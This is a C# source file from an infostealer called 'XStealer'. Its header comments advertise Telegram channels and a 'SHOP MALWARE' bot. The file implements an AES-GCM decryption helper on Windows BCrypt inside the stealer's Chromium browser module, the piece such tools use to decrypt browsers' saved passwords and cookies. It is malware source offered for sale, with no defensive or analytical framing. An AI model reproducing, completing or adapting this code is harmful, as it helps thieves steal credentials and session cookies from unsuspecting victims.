// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Chromium
{
    using System;
    using System.Runtime.InteropServices;
    using System.Security.Cryptography;
    using System.Text;
    using Helpers;

    public static class AesGcmEx
    {
        public static byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
        {
            IntPtr hAlg = OpenAlgorithmProvider(BCrypt.BCRYPT_AES_ALGORITHM, BCrypt.MS_PRIMITIVE_PROVIDER, BCrypt.BCRYPT_CHAIN_MODE_GCM), hKey, keyDataBuffer = ImportKey(hAlg, key, out hKey);
            var authInfo = new Structures.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
            byte[] ivData = new byte[MaxAuthTagSize(hAlg)];
            int plainTextSize = 0;
            uint status = NativeMethods.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, null, 0, ref plainTextSize, 0x0);
            if (status != BCrypt.ERROR_SUCCESS)
            {
                throw new CryptographicException($"BCrypt.BCryptDecrypt() (get size) failed with status code: {status}");
            }
            byte[] plainText = new byte[plainTextSize];
            status = NativeMethods.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, plainText, plainText.Length, ref plainTextSize, 0x0);
            if (status == BCrypt.STATUS_AUTH_TAG_MISMATCH)
            {
                throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
            }
            if (status != BCrypt.ERROR_SUCCESS)
            {
                throw new CryptographicException($"BCrypt.BCryptDecrypt() failed with status code:{status}");
            }
            NativeMethods.BCryptDestroyKey(hKey);
            Marshal.FreeHGlobal(keyDataBuffer);
            NativeMethods.BCryptCloseAlgorithmProvider(hAlg, 0x0);
            authInfo.Free();
            return plainText;
        }

        private static int MaxAuthTagSize(IntPtr hAlg)
        {
            byte[] tagLengthsValue = GetProperty(hAlg, BCrypt.BCRYPT_AUTH_TAG_LENGTH);
            int? result = BitConverter.ToInt32(new[] { tagLengthsValue[4], tagLengthsValue[5], tagLengthsValue[6], tagLengthsValue[7] }, 0);
            return result ?? 0;
        }

        internal static IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
        {
            uint status = NativeMethods.BCryptOpenAlgorithmProvider(out IntPtr hAlg, alg, provider, 0x0);
            if (status != BCrypt.ERROR_SUCCESS) { throw new CryptographicException($"BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{status}"); }
            byte[] chainMode = Encoding.Unicode.GetBytes(chainingMode);
            status = NativeMethods.BCryptSetAlgorithmProperty(hAlg, BCrypt.BCRYPT_CHAINING_MODE, chainMode, chainMode.Length, 0x0);
            if (status != BCrypt.ERROR_SUCCESS) { throw new CryptographicException($"BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{status}"); }
            return hAlg;
        }

        internal static IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
        {
            byte[] objLength = GetProperty(hAlg, BCrypt.BCRYPT_OBJECT_LENGTH);
            int keyDataSize = BitConverter.ToInt32(objLength, 0);
            IntPtr keyDataBuffer = Marshal.AllocHGlobal(keyDataSize);
            byte[] keyBlob = ConverterEx.Concat(BCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC, BitConverter.GetBytes(0x1), BitConverter.GetBytes(key.Length), key);
            uint status = NativeMethods.BCryptImportKey(hAlg, IntPtr.Zero, BCrypt.BCRYPT_KEY_DATA_BLOB, out hKey, keyDataBuffer, keyDataSize, keyBlob, keyBlob.Length, 0x0);
            if (status != BCrypt.ERROR_SUCCESS)
            {
                throw new CryptographicException($"BCrypt.BCryptImportKey() failed with status code:{status}");
            }
            return keyDataBuffer;
        }

        private static byte[] GetProperty(IntPtr hAlg, string name)
        {
            int size = 0;
            uint status = NativeMethods.BCryptGetProperty(hAlg, name, null, 0, ref size, 0x0);
            if (status != BCrypt.ERROR_SUCCESS)
            {
                throw new CryptographicException($"BCrypt.BCryptGetProperty() (get size) failed with status code:{status}");
            }
            var value = new byte[size];
            status = NativeMethods.BCryptGetProperty(hAlg, name, value, value.Length, ref size, 0x0);
            if (status != BCrypt.ERROR_SUCCESS)
            {
                throw new CryptographicException($"BCrypt.BCryptGetProperty() failed with status code:{status}");
            }
            return value;
        }
    }
}